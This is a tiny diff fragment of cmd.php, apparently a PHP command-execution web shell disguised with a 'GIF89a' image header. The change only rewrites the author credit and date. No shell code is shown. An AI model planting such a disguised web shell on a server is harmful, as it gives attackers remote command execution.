@@ -5,8 +5,8 @@ GIF89a
 //
 // cmd.php = Command Execution
 //
-// by: The Dark Raver
-// modified: 21/01/2004
+// by: huypq01
+// modified: 21/01/2025
 //
 ?>
 <HTML><BODY>
